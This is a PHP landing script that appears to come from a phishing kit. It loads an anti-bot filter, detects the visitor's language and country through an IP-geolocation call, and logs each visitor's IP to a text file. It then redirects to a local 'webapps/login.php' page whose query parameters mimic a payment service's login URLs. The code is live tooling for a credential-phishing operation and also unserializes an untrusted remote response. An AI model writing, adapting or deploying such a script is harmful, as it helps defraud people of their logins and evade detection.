<?php


session_start();
include 'antibots.php';

// Detect Browser Language !
$lang_var = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);


switch ($lang_var){
    case "fr":
        $lang= "fr";
        break;
    case "it":
        $lang= "it";
        break;
    case "EN":
        $lang= "EN";
        break;
    default:
        $lang= "EN";
        break;
}
$_SESSION['_lang_'] = $lang;
#END

// Get user IP address
if ( isset($_SERVER['HTTP_CLIENT_IP']) && ! empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif ( isset($_SERVER['HTTP_X_FORWARDED_FOR']) && ! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = (isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
}

$ip = filter_var($ip, FILTER_VALIDATE_IP);
$ip = ($ip === false) ? '0.0.0.0' : $ip;

// GET Country & Country CODE !

$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
if($query && $query['status'] == 'success') {
  $_SESSION['_country_'] = $query['country'];
  $_SESSION['_countryCode_'] = $query['countryCode'];
}

$redirect_page = "./webapps/login.php?country.x=".strtolower($_SESSION['_lang_']."&locale.x=".$query['countryCode'])."_".$query['countryCode'];
header('Location: '.$redirect_page);
#END




$file = fopen("visit.txt","a");

fwrite($file,$ip." || ".gmdate ("Y-n-d")." ----> || ".gmdate ("H:i:s")."|----|"."
\n");
  ?>














